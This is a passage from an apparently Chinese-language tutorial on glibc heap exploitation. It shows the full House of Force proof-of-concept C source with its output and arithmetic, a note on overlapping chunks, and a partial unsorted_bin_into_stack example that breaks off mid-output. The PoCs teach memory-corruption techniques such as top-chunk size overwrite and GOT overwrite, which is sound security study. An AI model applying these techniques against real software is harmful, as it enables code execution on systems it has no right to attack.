CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�

Let&#39;s write something inside p6

Data inside chunk p3:

FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
</code></pre><p>和上一个的区别在于，这次修改的是 allocated chunk 的 <code>chunk_size</code>。首先申请五个大小超过 fastbin 范围的 chunk，然后 <code>free(p4)</code>。随后通过 <code>p1</code> 的堆溢出修改 <code>p2</code> 的 <code>chunk_size</code> 为 <code>p2</code> 与 <code>p3</code> 的 <code>chunk_size</code> 之和。这就导致在 <code>free(p2)</code> 时，分配器认为需要释放 <code>chunk_size2+chunk_size3</code> 这么大一块内存，而下一块 chunk 恰好是同样空闲的 <code>p4</code>，这样就会将原本不相邻的 <code>p2</code> 和 <code>p4</code> 合并释放，中间的 <code>p3</code> 则成了最大受害者。</p><p>这时再申请一块 <code>chunk_size2+chunk_size3</code> 的 chunk<code>p6</code>，它就和 <code>p3</code> 重叠了，控制了整块 <code>p3</code> 的数据。</p><h2 id=house_of_force class="relative group">house_of_force <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_force aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>   This PoC works also with ASLR enabled.
</span></span></span><span class=line><span class=cl><span class=cm>   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
</span></span></span><span class=line><span class=cl><span class=cm>   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum
</span></span></span><span class=line><span class=cl><span class=cm>   (http://phrack.org/issues/66/10.html)
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>   Tested in Ubuntu 14.04, 64bit.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>bss_var</span><span class=p>[]</span> <span class=o>=</span><span class=s>&#34;This is a string that we want to overwrite.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span> <span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to the House of Force</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The top chunk is a special chunk. Is the last in memory &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;and is the chunk that will be resized when malloc asks for more space from the os.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>In the end, we will use this to overwrite a variable at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Its current value is: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s allocate the first chunk, taking space from the wilderness.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk of 256 bytes has been allocated at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_size</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Real size (aligned and all that jazz) of our allocated chunk is %ld.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_size</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//----- VULNERABILITY ----
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>ptr_top</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=n>real_size</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The top chunk starts at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr_top</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Old size of top chunk %#llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=kt>intptr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New size of top chunk %#llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>    <span class=c1>//------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>       <span class=s>&#34;Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>       <span class=s>&#34;overflow) and will then be able to allocate a chunk right over the desired region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
</span></span></span><span class=line><span class=cl><span class=cm>     * new_top = old_top + nb
</span></span></span><span class=line><span class=cl><span class=cm>     * nb = new_top - old_top
</span></span></span><span class=line><span class=cl><span class=cm>     * req + 2sizeof(long) = new_top - old_top
</span></span></span><span class=line><span class=cl><span class=cm>     * req = new_top - old_top - 2sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>     * req = dest - old_top - 4*sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>evil_size</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>bss_var</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>-</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>ptr_top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>       <span class=s>&#34;we will malloc %#lx bytes.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>,</span> <span class=n>ptr_top</span><span class=p>,</span> <span class=n>evil_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>new_ptr</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>evil_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;As expected, the new pointer is at the same place as the old top chunk: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>new_ptr</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>ctr_chunk</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now, the next chunk we overwrite will point at our target buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(100) =&gt; %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ctr_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can finally overwrite that value:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... old string: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... doing strcpy overwrite with </span><span class=se>\&#34;</span><span class=s>YEAH!!!</span><span class=se>\&#34;</span><span class=s>...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>ctr_chunk</span><span class=p>,</span><span class=s>&#34;YEAH!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... new string: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// some further discussion:
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//    &#34;and we \nwant to set this result to the address of malloc_got_address-8\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;After that a new call to malloc will return av-&gt;top+8 (+8 bytes for the header),&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//    &#34;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>//fprintf(stderr,&#34;The large chunk with evil_size has been allocated here 0x%08x\n&#34;,p2);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fprintf(stderr,&#34;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&#34;,malloc_got_address);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>//fprintf(stderr,&#34;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x602060.
Its current value is: This is a string that we want to overwrite.

Let&#39;s allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0x13b3000.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 280.

Now let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0x13b3110

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

The value we want to write to at 0x602060, and the top chunk is at 0x13b3110, so accounting for the header size,
we will malloc 0xffffffffff24ef30 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x13b3110

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) =&gt; 0x602060!
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with &#34;YEAH!!!&#34;...
... new string: YEAH!!!
</code></pre><p>这个例子里要覆盖的地址位于 bss 段，处于 heap 段的下方，但是 heap 是向高地址生长的。所以这里的核心思想是利用整数溢出。</p><p>首先需要存在堆溢出漏洞。我们分配一个 <code>chunk0</code>，此时堆上只有两个 chunk：<code>chunk0</code> 和 top chunk。利用溢出修改 top chunk 的 <code>chunk_size</code> 为 <code>-1</code>，即 <code>0xffffffffffffffff</code>。这样做是因为后面需要申请很大的 chunk 进行整数溢出，这很可能导致 top chunk 大小不够，不去从 top chunk 切割而是调用 <code>mmap()</code>。伪造了 top chunk 的大小后，在后面申请大 chunk 时就不会触发 <code>mmap()</code>，确保了申请的大 chunk 也是从 top chunk 切割的。</p><p>接下来我们申请一个 <code>evil_size</code> 大小的 chunk，使得申请后 top chunk 指针（经过整数溢出）指向我们想要覆盖的变量 <code>bss_var</code> 的前面。这个 <code>evil_size</code> 的计算方法如下：</p><pre tabindex=0><code>The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
* new_top = old_top + nb
* nb = new_top - old_top
* req + 2sizeof(long) = new_top - old_top
* req = new_top - old_top - 2sizeof(long)
* req = dest - 2sizeof(long) - old_top - 2sizeof(long)
* req = dest - old_top - 4*sizeof(long)
</code></pre><p>这时再次 <code>malloc</code>，得到的就是指向 <code>bss_var</code> 的指针了。</p><h2 id=unsorted_bin_into_stack class="relative group">unsorted_bin_into_stack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#unsorted_bin_into_stack aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span> <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating the victim chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span><span class=o>*</span> <span class=n>victim</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span><span class=o>*</span> <span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the chunk %p, it will be inserted in the unsorted bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Create a fake chunk on the stack&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set size for next allocation and the bk pointer to any writable address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=p>)</span><span class=n>stack_buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=p>)</span><span class=n>stack_buffer</span><span class=p>;</span> <span class=c1>// victim-&gt;bk is pointing to stack
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now next malloc will return the region of our fake chunk: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_buffer</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x100): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x2020010, it will be inserted in the unsorted bin
